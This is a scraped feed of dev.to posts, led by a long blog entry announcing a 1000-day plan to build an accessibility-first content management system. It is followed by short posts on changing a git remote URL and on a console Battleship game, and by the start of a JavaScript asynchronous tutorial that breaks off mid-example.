      <title>1000 days to £1million - this should be fun!</title>
      <author>InHuOfficial</author>
      <pubDate>Tue, 07 Dec 2021 23:19:54 +0000</pubDate>
      <link>https://dev.to/inhuofficial/1000-days-to-ps1million-this-should-be-fun-2d4e</link>
      <guid>https://dev.to/inhuofficial/1000-days-to-ps1million-this-should-be-fun-2d4e</guid>
      <description>&lt;p&gt;1000 days from now Inclusivity Hub will turnover £1million!&lt;/p&gt;

&lt;p&gt;Hearing that without any context I would guess that you probably have questions.&lt;/p&gt;

&lt;p&gt;Questions such as "what is Inclusivity Hub?", "why should I care?", "what are you doing in my bathroom?", those sort of common everyday questions.&lt;/p&gt;

&lt;p&gt;Well I will try and answer those questions.&lt;/p&gt;

&lt;p&gt;It is a long article (I am introducing the next 1000 days of my life so there is a fair bit to say!) and I don't expect too many people to read it in it's entirety, but if you do I am sure you will find at least a few interesting things that will make you want to follow me for the ride! (Actually I don't expect many people to read it at all as it will be a #watercooler post and we know those don't get much visibility 🤣)&lt;/p&gt;

&lt;p&gt;And don't worry, &lt;strong&gt;most&lt;/strong&gt; of the posts that follow on from this one will be shorter and more focused! &lt;/p&gt;

&lt;p&gt;Anyway, let me explain what I am doing and why as I think it is going to be interesting!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#a-little-preamble-to-set-the-scene"&gt;
  &lt;/a&gt;
  A little preamble to set the scene
&lt;/h2&gt;

&lt;p&gt;I have spent the last 18-24 months building a database all around accessibility and disability.&lt;/p&gt;

&lt;p&gt;A few weeks ago I was taking stock of the project and I realised that I will never complete the database (to a stage where I can release the product associated with it) on my own. It needs money and time and I am certainly not in a position to go looking for investment to complete it as I would have to give up far too much of the company at this stage.&lt;/p&gt;

&lt;p&gt;So a few weeks ago I reassessed the direction I was taking. &lt;/p&gt;

&lt;p&gt;Why was I building this database in the first place? (to improve accessibility) &lt;/p&gt;

&lt;p&gt;Can I produce a product or service more quickly that could generate the revenue required to pay for staff and researchers to complete this product? (as I still want to build it at some point as it could really be a game changer)&lt;/p&gt;

&lt;p&gt;Everything that follows is a result of that reassessment and I really do hope you find it interesting!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#completely-starting-over"&gt;
  &lt;/a&gt;
  Completely starting over!
&lt;/h2&gt;

&lt;p&gt;I won't say that the last 18-24 months have been completely wasted as I still have the work done on the database so far, but they haven't been productive months overall and have cost me a small fortune.&lt;/p&gt;

&lt;p&gt;So in essence I am back at square one! Zero turnover other than a few long standing clients and next to zero capital to work with (as  I burned through most of my savings in order to work less so I could build the database!) &lt;/p&gt;

&lt;p&gt;Now that realisation really did hurt (a lot) a few weeks back. It kind of still stings now to be honest as I have a lot of passion for that project. &lt;/p&gt;

&lt;p&gt;But in reality, here I am, nearly 2 years of "wasted" effort, a load of money "wasted" and having to start from scratch with nothing but the knowledge in my head and some good contacts to work with.&lt;/p&gt;

&lt;p&gt;Despite all that (and after licking my wounds) I realised, this is actually where the fun starts! Other people have built epic stuff from this position, I just needed to work out how to emulate them!&lt;/p&gt;

&lt;p&gt;After some thought I decided to run an experiment, a mega experiment at that.&lt;/p&gt;

&lt;p&gt;What would it take to go from "zero to hero" in less than 3 years?&lt;/p&gt;

&lt;p&gt;I have built some decent "lifestyle" businesses, but what about building a big business, a business that could be a behemoth in 5 or 10 years time, a world changer?&lt;/p&gt;

&lt;p&gt;You know, the sort of trajectory a lot of us would like to take but never quite find the gumption to give it a go or believe we can achieve?&lt;/p&gt;

&lt;p&gt;Now there are a lot of steps between the zero to hero random thought and this article, but it all boils down to falling in love with the idea of 1000 days to £1million as an interesting goal and being able to take the first step with this article. &lt;/p&gt;

&lt;p&gt;But I didn't stop there. Oh no!&lt;/p&gt;

&lt;p&gt;I spent ages trying to work out how I could work the changes in my personal life that would be required to achieve this into the equation too!&lt;/p&gt;

&lt;p&gt;Essentially this is a 1000 day experiment where I cut out the stuff that isn't productive, optimise the things I &lt;strong&gt;have&lt;/strong&gt; to do, and channel the extra time and energy into building something awesome, all while "bearing my soul" to the public! Eek!&lt;/p&gt;

&lt;p&gt;Or to put it another way, this is a 1000 day study with 1 participant on how systemising your life and planning more than a few weeks ahead can change your trajectory (or completely fail, who knows, that is the point of the experiment!) and turn you (me) into a super human!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#sound-exciting-you-dont-know-the-half-of-it"&gt;
  &lt;/a&gt;
  Sound exciting? You don't know the half of it.
&lt;/h2&gt;

&lt;p&gt;I have been a busy boy over the last 8 weeks.&lt;/p&gt;

&lt;p&gt;A couple of days of feeling sorry for myself first of all, followed by a couple of days of frustration and then I was in a place to pick myself up and start reassessing.&lt;/p&gt;

&lt;p&gt;I grabbed my focused writing software (it is called Cold Turkey Writer), set it to 4000 words minimum and just wrote. &lt;/p&gt;

&lt;p&gt;This is known as free writing (writing without purpose and without editing or even worrying if what you write makes any sense) and I find it really useful to help access thoughts that are buried deep in my subconscious.&lt;/p&gt;

&lt;p&gt;I spewed my anger and frustration onto the page, my darkest thoughts about myself and the world laid out in front of me (you know, the "I failed", "I wasted a load of time", "I wish I had been born with a small fortune" sort of harmful crap we tell ourselves while sat in our nice and warm houses surrounded by nice things, completely unaware of how lucky we are).&lt;/p&gt;

&lt;p&gt;I was about 1500 words into this tirade of self pity when suddenly the following sentence dropped onto the page (out of context it might look weird but I was ranting to myself about wasting time on menial tasks!).&lt;/p&gt;

&lt;p&gt;"I wish I had spent more time systemising things today to save time tomorrow."&lt;/p&gt;

&lt;p&gt;I mean, it is almost poetic! Are you crying at the beauty of my musings? No? Well how rude!&lt;/p&gt;

&lt;p&gt;Anyway, being serious for a second, that one sentence switched my brain into a different gear. It is one of the reasons I love freewriting and should do it more often. &lt;/p&gt;

&lt;p&gt;Systemisation is what my brain likes to do! Look at a process and find a way to systemise it is fun to me! Taking a long look at the opportunity cost of doing something (spending 20 hours systemising a process) vs the reward (an hour saved a week) and whether it is worth investing the time (absolutely).  &lt;/p&gt;

&lt;p&gt;I fell down a bit of a rabbit hole of idea generation and thought. &lt;/p&gt;

&lt;p&gt;4 hours later (and a total of 6500 words) I had the outline of the most ambitious plan I have ever conceived. &lt;/p&gt;

&lt;p&gt;I was going to invest the time into long term gains even if it means short term pain. &lt;/p&gt;

&lt;p&gt;That was the crux of it, a mentality of "focus on next year instead of the next week or next month".&lt;/p&gt;

&lt;p&gt;At that point I went to bed, it was late!&lt;/p&gt;

&lt;p&gt;The next day I was full of nervous energy. The voice in the back of my head was going "don't be silly, this will never work", but a louder voice was going "yeah, but just imagine if it did, nothing on that list is impossible, far from it, it is just difficult and will require some serious discipline".&lt;/p&gt;

&lt;p&gt;Needless to say I am here and writing this article so the good voice won! &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#enough-preamble-what-the-hell-are-you-on-about"&gt;
  &lt;/a&gt;
  Enough preamble, what the hell are you on about!
&lt;/h3&gt;

&lt;p&gt;Ok Ok, I know that was a lot of build up, but honestly you needed to know the context.&lt;/p&gt;

&lt;p&gt;I am going to build...A Content Management System (CMS)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;boo, hiss, I waited for that!? are you kidding me!&lt;/strong&gt; I hear you say.&lt;/p&gt;

&lt;p&gt;Just hang on, there is a hell of a lot more to this I promise.&lt;/p&gt;

&lt;p&gt;This isn't a story about building a CMS, this is a story of thinking in systems. This is a story of how to turn yourself into one of those 10x people who seem to be able to do everything.&lt;/p&gt;

&lt;p&gt;I am going to be sharing a lot more than just the journey of building and launching a CMS (I am twitching every time I say that, I promise I have some interesting ideas that will make it stand out so hang in there a little bit longer and I will explain and justify undertaking something that I would normally say you should avoid!).&lt;/p&gt;

&lt;p&gt;I am going to be sharing some of the systems I put in place to save time, the tools I build to help manage my time, optimise my workout regime, eat well, manage content creation, marketing, business planning and more!&lt;/p&gt;

&lt;p&gt;Essentially by the end of this experiment I am hoping I will not only have built an awesome product that is successful, but also built a step by step idiots guide and roadmap to doing the same.&lt;/p&gt;

&lt;p&gt;People don't seem to have done this before as far as I can tell (or maybe people have tried and failed and so we never heard about it 😱). &lt;/p&gt;

&lt;p&gt;There are plenty of guides on how to build a business, there are loads of guides on how to manage your time, there are loads of guides on marketing and branding.&lt;/p&gt;

&lt;p&gt;But they are always treated as separate entities and to me that is just not helpful.&lt;/p&gt;

&lt;p&gt;There is no way you can grow a mega business and not have your personal life sorted, know how to market (or find someone good at it) etc. They are all things that are heavily connected.&lt;/p&gt;

&lt;p&gt;And here is the thing, many people sacrifice their personal life for a business. I know, I have done it before and it &lt;strong&gt;sucks&lt;/strong&gt;. &lt;/p&gt;

&lt;p&gt;So while I am not going to pretend I am not going to work more hours than most people, there will also be balance there and I will be sharing how to &lt;strong&gt;make time&lt;/strong&gt; for friends and family without going off track.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ok-it-all-still-sounds-a-little-bit-vague-can-you-let-me-know-exactly-what-to-expect"&gt;
  &lt;/a&gt;
  Ok it all still sounds a little bit vague, can you let me know exactly what to expect?
&lt;/h3&gt;

&lt;p&gt;Sure thing, I am glad you asked!&lt;/p&gt;

&lt;p&gt;So I have split the next 1000 days into 5 sections, think of them as sprints! &lt;/p&gt;

&lt;p&gt;The ultimate goal of these thousand days is to build a company from zero to £1million turnover with a small budget and while having to support myself and my family.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#section-1-optimising"&gt;
  &lt;/a&gt;
  Section 1: Optimising
&lt;/h3&gt;

&lt;p&gt;The first section is "optimising", where I will be sharing little bits of software I build and systems I have developed to help manage my personal life, personal goals and time.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#section-2-ramp-up"&gt;
  &lt;/a&gt;
  Section 2: Ramp Up
&lt;/h3&gt;

&lt;p&gt;The second section is "ramp up" where I will be building some mini applications that are related to the CMS. These will be built in such a way that they can be sold as stand alone products but later integrate them into the main product.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#section-3-launch"&gt;
  &lt;/a&gt;
  Section 3: Launch
&lt;/h3&gt;

&lt;p&gt;The third section is "launch" in which I will be combining some of the products I have built into an Minimal Viable Product (MVP) for the CMS (nearly there if you are hanging on to see what will make  the CMS so special).&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#section-4-get-funding"&gt;
  &lt;/a&gt;
  Section 4: Get Funding
&lt;/h3&gt;

&lt;p&gt;The fourth section is "get funding" where I will share the journey of taking a MVP with a (hopefully) reasonable userbase and a decent social media following out for investment and what the pitching process is like.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#section-5-grow-fast"&gt;
  &lt;/a&gt;
  Section 5: Grow Fast
&lt;/h3&gt;

&lt;p&gt;And the final 5th section is "grow fast" where I will hopefully have secured funding and how to invest that money for growth (without being one of those silicon valley companies that think that loss making in exchange for users with no monetisation plan is in any way a good idea, profitable from day 1 is the concept here!)&lt;/p&gt;

&lt;p&gt;Hopefully that sounds interesting, but there is even more to this experiment!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#more-than-just-a-business-startup-follow-along"&gt;
  &lt;/a&gt;
  More than just a business start-up follow along?
&lt;/h2&gt;

&lt;p&gt;Oh you bet, I told you it was ambitious!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Firstly&lt;/strong&gt; I am going to be sharing my progress with you and that takes time, so it has to be worth it for me as well as you! &lt;/p&gt;

&lt;p&gt;You can think of it like a public diary (with some filtering of course) so you can see what is working and how often I fail and the mistakes I make! (There will be plenty of them I assure you!)&lt;/p&gt;

&lt;p&gt;Wherever appropriate I will by writing guides on how &lt;strong&gt;I&lt;/strong&gt; did things in the hope that they are useful.&lt;/p&gt;

&lt;p&gt;Hopefully you will get value from my wins and loses and I will get value as people will become interested in the journey I am taking (and if I do everything correctly build a decent following for Inclusivity Hub (InHu)).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Secondly&lt;/strong&gt; I am going to slowly reveal how each part of the puzzle leads to the next as some decisions may look strange out of context. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Why would I spend the time building XXX when I could just use service YYY, what does it lead to and what are the benefits? &lt;/li&gt;
&lt;li&gt;How does the personal life bit coincide with the business bit. &lt;/li&gt;
&lt;li&gt;How can you write a load of content and it help grow the business following pre and post launch while being entertaining and not (overly) self promoting all the time? &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Stuff like that.&lt;/p&gt;

&lt;p&gt;Honestly there is just too much to share in one go, but trust me I have planned a path through all this that means that no effort is wasted and everything has more than one purpose!&lt;/p&gt;

&lt;p&gt;And that (in my opinion) is the key to 10x performance. As often as possible make sure that what you are doing contributes towards two goals and repurpose things as often as possible.&lt;/p&gt;

&lt;p&gt;Live by the rule "We have limited time, use it wisely and efficiently."&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#ok-i-still-dont-get-it-but-it-certainly-sounds-exciting"&gt;
  &lt;/a&gt;
  OK, I still don't get it, but it certainly sounds exciting!
&lt;/h2&gt;

&lt;p&gt;Exactly, and you are too kind for saying so!&lt;/p&gt;

&lt;p&gt;I know it isn't 100% clear as it is a big and complex beast with a lot of moving parts and I am trying to condense 8 weeks worth of planning into a single post. &lt;/p&gt;

&lt;p&gt;So let me summarise what &lt;strong&gt;you&lt;/strong&gt; will get out of following me on this journey.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;A look into my mind and how I approach things - my mind is a scary place though, so you have been warned.&lt;/li&gt;
&lt;li&gt;A set of rules and systems to help you optimise your own life, pick and choose the bits that work for you or follow every single one of them, it is up to you!&lt;/li&gt;
&lt;li&gt;Constant feedback on what works and what doesn't from someone who is "new" to a lot of things. (You would be surprised at the breadth of knowledge I have on some topics compared to how little of that knowledge I implement in my daily life! 🤣 Applying principles rather than just learning them is an entirely different kettle of fish!) &lt;/li&gt;
&lt;li&gt;A journey that will either end in success, "meh" results, or complete failure! No matter what it should be something you can learn from!&lt;/li&gt;
&lt;li&gt;Probably a load of free tools as I prototype the proof of concepts for things.&lt;/li&gt;
&lt;li&gt;A journey of building a business from scratch through to launch that is designed to scale, explained warts and all!&lt;/li&gt;
&lt;li&gt;Launching and growing a game changing CMS (yes, I am finally going to explain the end product!) and the struggles and hard spots on getting traction!&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#the-cms"&gt;
  &lt;/a&gt;
  The CMS
&lt;/h2&gt;

&lt;p&gt;If this is what you came here for then sorry if you had to read all that.&lt;/p&gt;

&lt;p&gt;I can imagine you are wondering why on Earth someone would build &lt;strong&gt;another&lt;/strong&gt; CMS in such a crowded market, with so many big players with mega budgets to try and compete against!&lt;/p&gt;

&lt;p&gt;Well let me tell you!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#accessibility"&gt;
  &lt;/a&gt;
  Accessibility
&lt;/h3&gt;

&lt;p&gt;The first thing is that the whole thing will be built "Accessibility First" rather than trying to make something accessible after the fact.&lt;/p&gt;

&lt;p&gt;This will be the main feature / selling point as few CMS systems are built this way (can you name one?). &lt;/p&gt;

&lt;p&gt;This means that the editor will be built so that it is usable with Screen Readers, Magnification Software, alternative input devices etc.&lt;/p&gt;

&lt;p&gt;It will also have options to change colours, fonts, layouts and more to meet the needs of an individual.&lt;/p&gt;

&lt;p&gt;A truly accessible CMS would be a game changer in a world that is moving towards inclusivity and the next few years are the ideal time to strike!&lt;/p&gt;

&lt;p&gt;The second thing is that it will be built "Accessibility First". &lt;/p&gt;

&lt;p&gt;Wait, didn't I already say that? &lt;/p&gt;

&lt;p&gt;No this time I mean that all of the code it produces will enforce accessibility best practices and principles.&lt;/p&gt;

&lt;p&gt;Using a component based drag and drop system and with some clever workflows and prompts this CMS will not only be accessible for those who use it for editing but it will also tackle the scourge of accessibility...content writers who break any accessibility work you do within weeks or even days!&lt;/p&gt;

&lt;p&gt;This should help make sure that the front end stays accessible without the need for an accessibility expert correcting things every few months!&lt;/p&gt;

&lt;p&gt;The overall concept of this part is really simple, help businesses be part of the 2.6% of websites that don't have detectable accessibility errors! &lt;/p&gt;

&lt;p&gt;But achieve this without adding any extra effort on their part, allowing them to increase the number of people they can reach and reduce the chance of excluding people, bad press and litigation under accessibility laws.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#fast-as-fast-can-be"&gt;
  &lt;/a&gt;
  Fast as fast can be
&lt;/h3&gt;

&lt;p&gt;The other thing that is important is speed and web vitals.&lt;/p&gt;

&lt;p&gt;There are hundreds of tricks I have up my sleeve for this one but they key is in &lt;strong&gt;reducing flexibility&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Yeah you heard me, I want to make a system that reduces the options people have as this will ultimately help keep their sites both on brand and highly performant.&lt;/p&gt;

&lt;p&gt;Most CMS / site builders try to be all things to all people and therefore never work perfectly for anyone!&lt;/p&gt;

&lt;p&gt;I would rather target this system at a particular set of companies who will benefit from rigidity and speed over the ability to move a button 5px to the left!&lt;/p&gt;

&lt;p&gt;By utilising pre-built components that are customisable in style (via global styling decisions with certain contrast restrictions where it matters etc,) but carefully designed from a HTML / JS interactions perspective we can ensure they are accessible &lt;strong&gt;and&lt;/strong&gt; fast.&lt;/p&gt;

&lt;p&gt;Couple that with a concept I call "Self Optimising Websites (SOW)" (a system where the browsers sends back information about the critical CSS on a page, image dimensions at certain screen widths etc. and optimises the site and "learns" how to make itself faster)  and this CMS is going to promise something nobody else can - 95+ on Page Speed Insights for every site.&lt;/p&gt;

&lt;p&gt;Honestly the whole SOW system is something that really excites me, and no it isn't machine learning it is pure algorithms and careful structuring. But the concept could be a game changer in and of itself.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#designed-for-content-creation"&gt;
  &lt;/a&gt;
  Designed for content creation
&lt;/h3&gt;

&lt;p&gt;The third pillar of this CMS is the way the content creation is handled.&lt;/p&gt;

&lt;p&gt;Every CMS I have seen is clunky and doesn't offer any well thought out and optimised processes for creating high quality content.&lt;/p&gt;

&lt;p&gt;By providing tools for research, checklists, templates, wizards and more, directly within a predefined workflow, the system can make it easy for content creators to produce content that is higher quality and in less time.&lt;/p&gt;

&lt;p&gt;Couple it with a system that will assess the writing and document structure for things like reading age, skipped headings etc. and it should make even an average writer look great! Well that is what I hope as I need something to elevate my writing!&lt;/p&gt;

&lt;p&gt;Combine all of that with a carefully crafted content creation calendar and checklists for promoting content after publication and you can see why this would be exciting.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#more-unique-features"&gt;
  &lt;/a&gt;
  More unique features
&lt;/h3&gt;

&lt;p&gt;Because you have stuck with me this long here are a few more features that will be part of the system that I haven't seen before!&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;future article markers&lt;/strong&gt; - it is annoying when you are writing an article and know that an article you have planned would link nicely within the current article. The system allows for markers that remind you to fill in these links when the future article is released!&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;research integration&lt;/strong&gt; - having all the research for an article in one place without having to jump between sites is super handy! I even have a plugin planned that makes the process of gathering research super simple!&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;code snippets creator&lt;/strong&gt; - one for my fellow Devs! This snippet creator will have social sharing built in! It will link back to the snippet on the site automatically to fix the accessibility problems of "code in an image" that we are forced to use, and to drive traffic back to the site at the same time.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You know what, I will stop there (I was going to list a load of other features but I think I have given you a taste), you will have to follow me to find out more!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#ok-sounds-fun-is-there-anything-else"&gt;
  &lt;/a&gt;
  Ok sounds fun, is there anything else?
&lt;/h2&gt;

&lt;p&gt;Yeah the last thing is my content.&lt;/p&gt;

&lt;p&gt;I am about to ramp it up ready for the new year.&lt;/p&gt;

&lt;p&gt;My content is going to be a mix of updates on implementing systems and what works, revealing new toys for you to play with and mega series! (Oh and don't worry, there will still be some angry rants scattered throughout but probably not as often!)&lt;/p&gt;

&lt;p&gt;Oh wait, I didn't mention mega series yet did I? Let's fix that!&lt;/p&gt;

&lt;p&gt;To help promote the CMS I have crafted and planned some series that run along side it beautifully and should hopefully provide some value back to the community (while also helping me develop the things I need for my product!).&lt;/p&gt;

&lt;p&gt;So the series I have planned are:&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ultimate-ui"&gt;
  &lt;/a&gt;
  Ultimate UI
&lt;/h3&gt;

&lt;p&gt;Over 80 in depth posts on 80+ different components that are carefully crafted from the ground up to be as close to perfection as possible. &lt;/p&gt;

&lt;p&gt;They will include things like Right to Left compatibility and internationalisation, accessibility considerations, fall backs for older browsers, flexible styling options following a global settings pattern and they will be light-weight to meet performance targets.&lt;/p&gt;

&lt;p&gt;The aim is to build a library of components that will form the front end and back end part of the CMS that are accessible, fast and provide a great User Experience&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#building-a-light-weight-analytics-system"&gt;
  &lt;/a&gt;
  Building a light weight analytics system
&lt;/h3&gt;

&lt;p&gt;More and more people are turning their back on Google Analytics and I have some pretty interesting ideas on combining analytics with the Self Optimising Websites system. &lt;/p&gt;

&lt;p&gt;I wouldn't tackle this if there weren't some other benefits to the company so you will have to follow me to find out why I would include this in the plan!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#ultimate-guides"&gt;
  &lt;/a&gt;
  Ultimate Guides
&lt;/h3&gt;

&lt;p&gt;This is a short series with only 6 articles planned.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The ultimate guide to forms on the web&lt;/li&gt;
&lt;li&gt;The ultimate guide to images on the web&lt;/li&gt;
&lt;li&gt;The ultimate guide to website speed&lt;/li&gt;
&lt;li&gt;The ultimate guide to HTML&lt;/li&gt;
&lt;li&gt;The ultimate guide to WCAG&lt;/li&gt;
&lt;li&gt;The ultimate guide to ATAG&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now these aren't your average articles. &lt;/p&gt;

&lt;p&gt;For example: I am currently writing the "ultimate guide to forms on the web". I have over 100 different sections in it. &lt;/p&gt;

&lt;p&gt;Currently I have only written the &lt;strong&gt;first 2&lt;/strong&gt; of those sections and the word count is over 3500 words. &lt;/p&gt;

&lt;p&gt;Yes these really are going to be mega reference pieces and anchors around which all other content is created.&lt;/p&gt;

&lt;p&gt;To illustrate the idea behind this "dual purpose" thing I am implementing, the guides are to be used as internal reference when designing the CMS, for marketing and for content generation for other marketing channels (eBooks, infographics, twitter threads etc.).&lt;/p&gt;

&lt;p&gt;They also serve a final purpose...as test beds for ideas on content creation workflows and for highlighting tools I need to build!&lt;/p&gt;

&lt;p&gt;See, 10x thought process on everything!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#wrapping-up-finally"&gt;
  &lt;/a&gt;
  Wrapping up finally!
&lt;/h2&gt;

&lt;p&gt;Are you still with me after all that?&lt;/p&gt;

&lt;p&gt;Do you have any idea what I am on about?&lt;/p&gt;

&lt;p&gt;Who knows, but one thing I do know is this is going to be spectacular (either a spectacular success or a spectacular fail! 🤣)&lt;/p&gt;

&lt;p&gt;If you found anything interesting and have any questions then the floor is yours, drop me a comment or &lt;a href="https://twitter.com/InHuOfficial"&gt;DM me on Twitter&lt;/a&gt; if you prefer, I would appreciate the support if nothing else!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#keeping-track"&gt;
  &lt;/a&gt;
  Keeping track
&lt;/h2&gt;

&lt;p&gt;999 days remaining!&lt;/p&gt;

&lt;p&gt;Goals and tracking:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;£0 monthly revenue / £1million annualised target&lt;/li&gt;
&lt;li&gt;1 post released so far&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I can't wait to start adding more stats and targets to that list for you to follow along!&lt;/p&gt;

&lt;p&gt;The next article in this series will be on systemising my personal life and cover things like eating healthily, exercising and scheduling and how to minimise the time spent vs results!&lt;/p&gt;

&lt;p&gt;Anyway, enough of my ramblings, see you all back here on the 1st September 2024 when I can see how much of my plan has come together and whether I hit the £1million mark! Until then I will see you in my next article (I hope).&lt;/p&gt;

      <title>How to change the url of a remote git repo...</title>
      <author>Nick Raphael</author>
      <pubDate>Tue, 07 Dec 2021 22:53:52 +0000</pubDate>
      <link>https://dev.to/nickraphael/how-to-change-the-url-of-a-remote-git-repo-2goi</link>
      <guid>https://dev.to/nickraphael/how-to-change-the-url-of-a-remote-git-repo-2goi</guid>
      <description>&lt;p&gt;Hi all,&lt;/p&gt;

&lt;p&gt;I recently got myself into the situation where all my local git repos had the wrong remote addresses.  This was caused by a change up on our git account.  &lt;/p&gt;

&lt;p&gt;You can see the url that git is currently using by opening the 'config' file in the .git folder.  You'll see it under the '[remote "origin"]' section.&lt;/p&gt;

&lt;p&gt;Luckily this is pretty trivial to fix.  You can either update the url directly in the config file, or run the following command...&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;git&lt;/span&gt; &lt;span class="nx"&gt;remote&lt;/span&gt; &lt;span class="kd"&gt;set&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt; &lt;span class="nx"&gt;origin&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;git&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nx"&gt;xyz&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

      <description>&lt;p&gt;Destroyer is a console game I made for my codecademy CSC 101 final project. It is very similar to the game battleship. It uses 2D list to represent the board classes and objects to organize and simplify the code. I know it's sloppy, and I'm sure more experienced devs will look at it like what is this, but it works well and I'm happy that I made it 😀&lt;/p&gt;

      <title>Understanding Asynchronous in javascript </title>
      <author>Heru Hartanto</author>
      <pubDate>Tue, 07 Dec 2021 22:32:36 +0000</pubDate>
      <link>https://dev.to/elukuro/understanding-asynchronous-in-javascript-267h</link>
      <guid>https://dev.to/elukuro/understanding-asynchronous-in-javascript-267h</guid>
      <description>&lt;p&gt;Let's me explain with a simple example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;First log&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Second log&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Third log&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As we can see, every line of code will waits for previous line to complete execution before execute next line. this is called with synchronous.&lt;/p&gt;

&lt;p&gt;Here another example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;First log&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(()&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Second log&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;},&lt;/span&gt;&lt;span class="mi"&gt;2000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Third log&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;setTimeout function will wait for milisecond time that set in second argument and executes anonymous function in the first arguments&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
